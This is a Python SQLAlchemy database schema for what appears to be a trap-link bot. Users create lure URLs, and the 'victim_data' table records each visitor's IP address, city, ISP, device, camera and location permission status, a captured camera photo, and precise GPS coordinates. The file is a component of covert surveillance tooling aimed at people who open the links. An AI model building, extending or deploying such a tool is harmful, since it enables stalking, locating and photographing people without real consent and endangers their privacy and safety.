from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text, Boolean, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship
from datetime import datetime
from config import Config

Base = declarative_base()

class AccessList(Base):
    __tablename__ = "access_list"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, unique=True, index=True)
    username = Column(String, nullable=True)
    granted_at = Column(DateTime, default=datetime.utcnow)
    granted_by = Column(Integer)

class TrapURL(Base):
    __tablename__ = "trap_urls"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String, unique=True, index=True)
    creator_id = Column(Integer, index=True)
    creator_username = Column(String, nullable=True)
    image_path = Column(String)
    created_at = Column(DateTime, default=datetime.utcnow)
    is_active = Column(Boolean, default=True)
    
    # Relationship to captured data
    captures = relationship("VictimData", back_populates="trap_url")

class VictimData(Base):
    __tablename__ = "victim_data"
    
    id = Column(Integer, primary_key=True, index=True)
    trap_url_id = Column(Integer, ForeignKey("trap_urls.id"))
    
    # IP and Location Info
    ip_address = Column(String)
    country = Column(String, nullable=True)
    region = Column(String, nullable=True)
    city = Column(String, nullable=True)
    latitude = Column(String, nullable=True)
    longitude = Column(String, nullable=True)
    isp = Column(String, nullable=True)
    
    # Device Info
    user_agent = Column(Text, nullable=True)
    device_type = Column(String, nullable=True)
    browser = Column(String, nullable=True)
    os = Column(String, nullable=True)
    
    # Permissions and Media
    camera_permission = Column(String, nullable=True)  # "granted", "denied", "not_requested"
    location_permission = Column(String, nullable=True)  # "granted", "denied", "not_requested"
    camera_photo_path = Column(String, nullable=True)
    gps_latitude = Column(String, nullable=True)
    gps_longitude = Column(String, nullable=True)
    gps_accuracy = Column(String, nullable=True)
    
    # Timestamps
    accessed_at = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    trap_url = relationship("TrapURL", back_populates="captures")

class UserStep(Base):
    __tablename__ = "user_steps"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, index=True)
    step = Column(String)  # "waiting_for_name", "waiting_for_photo", etc.
    data = Column(Text, nullable=True)  # JSON data for multi-step processes
    created_at = Column(DateTime, default=datetime.utcnow)

# Database setup
config = Config.from_env()
engine = create_engine(config.DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def create_tables():
    Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
